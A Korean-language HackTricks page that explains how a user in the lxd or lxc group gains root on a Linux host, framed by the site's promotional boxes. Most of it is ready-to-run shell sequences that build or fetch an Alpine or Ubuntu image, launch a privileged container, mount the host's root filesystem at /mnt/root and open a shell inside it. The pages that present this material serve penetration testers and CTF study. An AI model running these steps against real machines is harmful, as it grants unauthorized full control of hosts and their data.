# lxd/lxc 그룹 - 권한 상승

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

_**lxd**_ **또는** _**lxc**_ **그룹**에 속한다면 root가 될 수 있습니다.

## 인터넷 없이 악용하기

### 방법 1

이 디스트로 빌더를 컴퓨터에 설치할 수 있습니다: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(github의 지침을 따르세요):
```bash
sudo su
#Install requirements
sudo apt update
sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools
#Clone repo
git clone https://github.com/lxc/distrobuilder
#Make distrobuilder
cd distrobuilder
make
#Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
#Create the container
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
```
파일 **lxd.tar.xz**와 **rootfs.squashfs**를 업로드하고, 이미지를 저장소에 추가하고 컨테이너를 생성하세요.
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
{% hint style="danger" %}
만약 이 오류를 발견한다면 _**오류: 저장 풀을 찾을 수 없습니다. 새로운 저장 풀을 생성하십시오**_\
**`lxd init`**를 실행하고 이전 명령어 청크를 **반복**하십시오
{% endhint %}

마지막으로 컨테이너를 실행하고 루트 권한을 얻을 수 있습니다:
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### 방법 2

알파인 이미지를 빌드하고 `security.privileged=true` 플래그를 사용하여 시작하면, 컨테이너가 호스트 파일 시스템과 루트로 상호 작용하도록 강제합니다.
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

# interact with the container
lxc start mycontainer
lxc exec mycontainer /bin/sh
```
대신 [https://github.com/initstring/lxd\_root](https://github.com/initstring/lxd\_root)를 사용할 수 있습니다.

## 인터넷을 통해

[이 지침](https://reboare.github.io/lxd/lxd-escape.html)을 따를 수 있습니다.
```bash
lxc init ubuntu:16.04 test -c security.privileged=true
lxc config device add test whatever disk source=/ path=/mnt/root recursive=true
lxc start test
lxc exec test bash
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
## 참고 자료

* [https://reboare.github.io/lxd/lxd-escape.html](https://reboare.github.io/lxd/lxd-escape.html)
* [https://etcpwd13.github.io/greyfriar_blog/blog/writeup/Notes-Included/](https://etcpwd13.github.io/greyfriar_blog/blog/writeup/Notes-Included/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로에서 영웅까지 AWS 해킹을 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 기교를 공유**하세요.

</details>
